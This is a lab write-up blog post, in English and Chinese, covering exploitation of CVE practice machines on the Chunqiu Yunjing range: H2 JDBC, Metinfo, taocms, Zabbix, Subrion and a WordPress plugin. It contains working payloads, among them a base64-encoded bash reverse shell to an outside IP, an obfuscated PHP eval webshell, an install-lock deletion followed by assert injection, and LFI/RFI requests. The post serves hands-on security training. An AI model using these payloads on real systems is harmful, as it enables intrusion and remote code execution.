@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>春秋云镜靶场 | ULGANOY</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="A simple record.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜靶场">
+<meta property="og:url" content="http://n0zom1z0.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E9%9D%B6%E5%9C%BA/index.html">
+<meta property="og:site_name" content="ULGANOY">
+<meta property="og:description" content="A simple record.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://n0zom1z0.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E9%9D%B6%E5%9C%BA/images/image.png">
+<meta property="article:published_time" content="2024-01-25T09:35:22.000Z">
+<meta property="article:modified_time" content="2024-02-22T14:31:48.598Z">
+<meta property="article:author" content="ULGANOY">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://n0zom1z0.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E9%9D%B6%E5%9C%BA/images/image.png">
+  
+    <link rel="alternate" href="/atom.xml" title="ULGANOY" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">ULGANOY</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Kitauji Fightooooo!</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://N0zoM1z0.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-春秋云镜靶场" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E9%9D%B6%E5%9C%BA/" class="article-date">
+  <time class="dt-published" datetime="2024-01-25T09:35:22.000Z" itemprop="datePublished">2024-01-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      春秋云镜靶场
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>A simple record.</p>
+<span id="more"></span>
+
+<h1 id="CVE-2022-22733"><a href="#CVE-2022-22733" class="headerlink" title="CVE-2022-22733"></a>CVE-2022-22733</h1><p>It is my first time to learn <strong>“PENETRATION”</strong> (just the same feeling as this)<br>Some skills are first to me. For this reason I will record it detaily.</p>
+<p>Referencde:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46029520/article/details/128222905">+</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/niubi707/article/details/128176246">++</a></li>
+</ul>
+<p>Although it is sad that I hadn’t manage to getflag, wtf the timeout… It is still meaningful~</p>
+<p>First we use username:guest and passwd:guest + burpsuite to intercept,<br>find that the b64decoded token contains the admin’s username and passwd.</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;rootUsername&quot;:&quot;root&quot;,&quot;rootPassword&quot;:&quot;root&quot;,&quot;guestUsername&quot;:&quot;guest&quot;,&quot;guestPassword&quot;:&quot;guest&quot;,&quot;base64&quot;:...&#125;</span><br></pre></td></tr></table></figure>
+
+<p>so we can login as root<br>we need use bounceshell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 1234</span><br></pre></td></tr></table></figure>
+
+<p>then we prepare Malicious code, using sql.</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> ALIAS <span class="keyword">EXEC</span> <span class="keyword">AS</span> <span class="string">&#x27;String shellexec(String cmd) throws java.io.IOException &#123;Runtime.getRuntime().exec(cmd);return &quot;123&quot;;&#125;&#x27;</span>;<span class="keyword">CALL</span> <span class="keyword">EXEC</span> (<span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuNDguOTYuMTAwLzEyMzQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>the cmd is:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>save it as hack.sql</p>
+<p>next, use python to start a httpserver:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">9999</span></span><br></pre></td></tr></table></figure>
+
+<p>and move .sql to the root of http</p>
+<p>Finally, find EventDataTraceSource and add<br>url: jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM ‘<a target="_blank" rel="noopener" href="http://0.0.0.0:9999/hack.sql">http://0.0.0.0:9999/hack.sql</a>‘</p>
+<p>Theroritcally, it should work…… WTF the IO.Exception… I don’t know how to solve this …</p>
+<hr>
+<hr>
+<p>For the first time I know how to use bouceshell…<br>Linux1:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 1234</span><br></pre></td></tr></table></figure>
+
+<p>Linux2:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/1234 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p>GetShell!!!</p>
+<h1 id="CVE-2018-12530"><a href="#CVE-2018-12530" class="headerlink" title="CVE-2018-12530"></a>CVE-2018-12530</h1><p>Metinfo 6.0.0任意文件删除<br>进入靶场 访问&#x2F;admin 后台登陆<br>解除Install lock</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin/app/batch/csvup.php?fileField=test-1&amp;flienamecsv=../../../config/install.lock</span><br></pre></td></tr></table></figure>
+
+<p>然后访问&#x2F;install<br>重点在第三步数据库设置<br>数据库密码: (闭合sql语句)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;*/assert($_REQUEST[1])/*&quot;</span><br></pre></td></tr></table></figure>
+
+<p>保存后访问 &#x2F;config&#x2F;config_db.php?1&#x3D;phpinfo();<br>可以执行 写🐎 config&#x2F;config_db.php?1&#x3D;eval($POST[‘hack’])<br>蚁剑一把梭</p>
+<h1 id="CVE-2022-25578"><a href="#CVE-2022-25578" class="headerlink" title="CVE-2022-25578"></a>CVE-2022-25578</h1><p>taocms v3.0.2允许攻击者通过编辑.htaccess文件执行任意代码</p>
+<p>貌似有多种打法 这里就用编辑.htaccess来打<br>访问&#x2F;admin 弱口令admin登陆<br>在文件管理处编辑.htaccess</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>
+
+<p>然后准备一个简易图片🐎<br>这里最简单的马都能连<br>学一手高级点的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="class"><span class="keyword">class</span> <span class="title">G6MdvLsT</span> </span>&#123; <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$HF24f</span></span>)</span>&#123; @<span class="keyword">eval</span>(<span class="string">&quot;/*Z196iMYYE9*/&quot;</span>.<span class="variable">$HF24f</span>.<span class="string">&quot;&quot;</span>); &#125;&#125;<span class="keyword">new</span> <span class="title function_ invoke__">G6MdvLsT</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>缩略图上传 成功后会显示路径 蚁剑连一把梭</p>
+<h1 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a>CVE-2022-32991</h1><p>开局一个登陆&#x2F;注册页面<br>这里sql注入是无果的<br>注册一个号登进去 发现三个quiz<br>注意到第一个点进去发现是php报错<br>同时url是这种:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eci-2ze2lwuvvf4rayf8ifyf.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=3</span><br></pre></td></tr></table></figure>
+
+<p>发现每次点击submit n的值就+1 尝试n&#x3D;3’发现报错 应该能报错注入<br>由于需要cookie等登陆信息 bp抓get包后sqlmap一把梭<br><img src="/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E9%9D%B6%E5%9C%BA/images/image.png" alt="img"></p>
+<hr>
+<hr>
+<p>sql注入的关键都是注入点的准确挖掘!!!</p>
+<h1 id="CVE-2022-23134"><a href="#CVE-2022-23134" class="headerlink" title="CVE-2022-23134"></a>CVE-2022-23134</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Zabbix Sia Zabbix是拉脱维亚Zabbix SIA（Zabbix Sia）公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。 Zabbix 存在安全漏洞，该漏洞源于在初始设置过程之后，setup.php 文件的某些步骤不仅可以由超级管理员访问，也可以由未经身份验证的用户访问。</span><br></pre></td></tr></table></figure>
+
+<p>不是题目说的打法<br>这里利用的是类似ssrf的打法<br>zabbix 默认Admin zabbix 登陆后<br>在Adminxxx&#x2F;scripts下找到ping命令<br><a target="_blank" rel="noopener" href="http://www.dnslog.cn/">dnslog</a>起一个subdomain 修改script并在monitor&#x2F;maps下执行ping发现确实存在ssrf<br>那就直接读取flag<br><code>cat ../../../../../../../../flag</code></p>
+<h1 id="CVE-2018-19422"><a href="#CVE-2018-19422" class="headerlink" title="CVE-2018-19422"></a>CVE-2018-19422</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Subrion CMS 4.2.1 存在文件上传漏洞</span><br></pre></td></tr></table></figure>
+
+<p>难点在于在哪儿上传什么后缀的文件…<br>admin&#x2F;admin 弱密码登陆<br>在profile处可以上传avatar 但是传php蚁剑可以连但是添加无法进… 假shell…<br>看wp说是点右上角设置进入后台 content处有个upload<br>上传 .pht后缀的马!!! 其他格式的都不行！！！<br><code>PHT文件是一个HTML页面，其中包括一个PHP脚本。这种格式似乎已过时，不再使用。</code></p>
+<p>真的很神奇… 传.pht后可以打开 其他都打不开… 新姿势…<br>连上蚁剑一把梭…</p>
+<h1 id="CVE-2018-16283"><a href="#CVE-2018-16283" class="headerlink" title="CVE-2018-16283"></a>CVE-2018-16283</h1><p>WordPress Plugin Wechat Broadcast LFI</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># Exploit Title: WordPress Plugin Wechat Broadcast 1.2.0 - Local File Inclusion</span><br><span class="line"># Author: Manuel Garcia Cardenas</span><br><span class="line"># Date: 2018-09-19</span><br><span class="line"># Software link: https://es.wordpress.org/plugins/wechat-broadcast/</span><br><span class="line"># CVE: CVE-2018-16283</span><br><span class="line"></span><br><span class="line"># Description</span><br><span class="line"># This bug was found in the file: /wechat-broadcast/wechat/Image.php</span><br><span class="line"># echo file_get_contents(isset($_GET[&quot;url&quot;]) ? $_GET[&quot;url&quot;] : &#x27;&#x27;);</span><br><span class="line"># The parameter &quot;url&quot; it is not sanitized allowing include local or remote files</span><br><span class="line"># To exploit the vulnerability only is needed use the version 1.0 of the HTTP protocol </span><br><span class="line"># to interact with the application.</span><br><span class="line"></span><br><span class="line"># PoC</span><br><span class="line"># The following URL have been confirmed that is vulnerable to local and remote file inclusion.</span><br><span class="line"></span><br><span class="line">GET /wordpress/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=../../../../../../../../../../etc/passwd</span><br><span class="line"></span><br><span class="line"># Remote File Inclusion POC:</span><br><span class="line"></span><br><span class="line">GET /wordpress/wp-content/plugins/wechat-broadcast/wechat/Image.php?url=http://malicious.url/shell.txt</span><br></pre></td></tr></table></figure>
+
+<p>首先在wordpress的后台登陆 <code>/wp-admin</code><br>wpscan扫出<code>test</code>用户名 弱口令 <code>test test</code> 登陆<br>然后按照上面POC的打 读取 <code>/flag</code> 即可</p>
+<p>但实操的时候 要用 <code>?url=file:///flag</code> 伪协议来读才读得到(…)</p>
+<p>贴一个wordpress的渗透基础步骤 <a target="_blank" rel="noopener" href="https://c0okb.github.io/2020/05/01/wordpress-vulnhub"><code>++</code></a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://n0zom1z0.github.io/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E9%9D%B6%E5%9C%BA/" data-id="clt7z1ktc001jq4th248zfs2q" data-title="春秋云镜靶场" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/Hack-The-Box/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          Hack-The-Box
+        
+      </div>
+    </a>
+  
+  
+    <a href="/VT%E5%A4%84%E7%90%86%E5%99%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">VT处理器虚拟化技术学习</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Crypto/">CTF-Crypto</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Re/">CTF-Re</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Reverse/">CTF-Reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-WP/">CTF-WP</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-Web/">CTF-Web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/ReverseEngineering/">ReverseEngineering</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WHK/">WHK</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/osu/">osu</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF-Crypto/" rel="tag">CTF-Crypto</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF-Crypto/" style="font-size: 10px;">CTF-Crypto</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/02/">二月 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/01/">一月 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/12/">十二月 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/%E5%AF%86%E7%A0%81%E5%AD%A6%E8%84%9A%E6%9C%AC/">密码学脚本</a>
+          </li>
+        
+          <li>
+            <a href="/Crypto-Other-2/">Crypto-Other-2</a>
+          </li>
+        
+          <li>
+            <a href="/Hack-The-Box/">Hack-The-Box</a>
+          </li>
+        
+          <li>
+            <a href="/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C%E9%9D%B6%E5%9C%BA/">春秋云镜靶场</a>
+          </li>
+        
+          <li>
+            <a href="/VT%E5%A4%84%E7%90%86%E5%99%A8%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/">VT处理器虚拟化技术学习</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 ULGANOY<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
